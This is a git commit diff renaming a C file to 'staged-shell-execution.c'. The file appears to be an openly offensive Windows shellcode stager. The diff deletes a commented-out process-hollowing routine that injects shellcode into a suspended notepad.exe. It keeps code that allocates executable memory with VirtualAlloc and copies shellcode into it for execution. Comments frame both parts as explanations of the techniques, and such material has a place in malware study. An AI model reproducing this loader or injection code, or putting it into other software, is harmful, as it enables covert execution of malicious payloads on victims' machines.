989919756e114890d8f6b8d86c6fbc0892eae8e2
b_illy__ <118596346+BiLLY-J03l@users.noreply.github.com>
2024-12-16 03:10:57 +0200

    Update and rename stager.c to staged-shell-execution.c

--- staged-shell-execution.c
+++ staged-shell-execution.c
@@ -36,42 +36,12 @@ int main(int argc,char *argv[]){
 	*/
 	//end debug
 	
-	/*
-	//this code snippet explains how process hollowing works
-	
-	
-	void *exec_mem;
-	STARTUPINFOA *startupinfo=malloc(1*sizeof(STARTUPINFOA));
-	PROCESS_INFORMATION *procinfo=malloc(1*sizeof(PROCESS_INFORMATION));
-    ZeroMemory(startupinfo, sizeof(STARTUPINFOA));
-    ZeroMemory(procinfo, sizeof(PROCESS_INFORMATION));
-	if(CreateProcessA("C:\\Windows\\notepad.exe",NULL,NULL,NULL,FALSE,CREATE_SUSPENDED,NULL,NULL,startupinfo,procinfo) == 0){
-		printf("[x] Failed to create process,error (%ld)\n",GetLastError());
-		exit(1);			
-	};
-	// hProcess.procinfo -> handle
-	exec_mem=VirtualAllocEx(procinfo->hProcess,NULL,sizeof(shellcode), (MEM_COMMIT | MEM_RESERVE),PAGE_EXECUTE_READWRITE);
-	WriteProcessMemory(procinfo->hProcess,exec_mem,shellcode,sizeof(shellcode),NULL);
-	if (ResumeThread(procinfo->hThread) == -1){
-		printf("[x] Failed to resume process,error (%ld)\n",GetLastError());
-		exit(1);		
-	}
-	
-	free(startupinfo);
-	free(procinfo);
-	
-	*/
-	
 	
 	
 	
 	//this code snippet explains how shellcode execution works
-	//we won't need it cause we already injecting a process.
-	
 	void *exec=VirtualAlloc(NULL,sizeof(shellcode),MEM_COMMIT | MEM_RESERVE,PAGE_EXECUTE_READWRITE);
-	
 	if (exec == NULL){printf("[x]can't allocate memory, error %ld\n",GetLastError());exit(1);}
-	
 	
 	RtlMoveMemory(exec,shellcode,sizeof(shellcode));
 	//memcpy(exec,shellcode,sizeof(shellcode));	alternative for RtlMoveMemory()
